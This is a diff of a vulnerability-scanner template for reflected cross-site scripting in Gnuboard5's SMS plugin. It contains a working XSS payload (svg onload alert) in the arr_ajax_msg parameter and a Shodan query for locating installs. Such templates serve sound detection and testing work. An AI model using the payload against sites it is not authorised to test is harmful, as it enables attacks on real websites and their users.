@@ -1,5 +1,4 @@
 id: gnuboard-sms-xss
-
 info:
   name: Gnuboard CMS - Cross-Site Scripting
   author: gy741
@@ -14,29 +13,26 @@ info:
     cwe-id: CWE-80
     cpe: cpe:2.3:a:gnuboard:gnuboard5:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
     max-request: 1
+    product: gnuboard5
+    shodan-query: http.html:"Gnuboard"
     vendor: gnuboard
-  tags: xss,gnuboard,vuln
-
+    verified: true
+  tags: gnuboard,vuln,xss
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/plugin/sms5/ajax.sms_emoticon.php?arr_ajax_msg=gnuboard<svg+onload=alert(document.domain)>"
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
+  - matchers:
+      - part: body
+        type: word
         words:
           - '"0nuboard<svg onload=alert(document.domain)>"'
-
-      - type: word
-        part: header
+      - part: header
+        type: word
         words:
-          - "text/html"
-
-      - type: status
-        status:
+          - text/html
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/plugin/sms5/ajax.sms_emoticon.php?arr_ajax_msg=gnuboard<svg+onload=alert(document.domain)>'
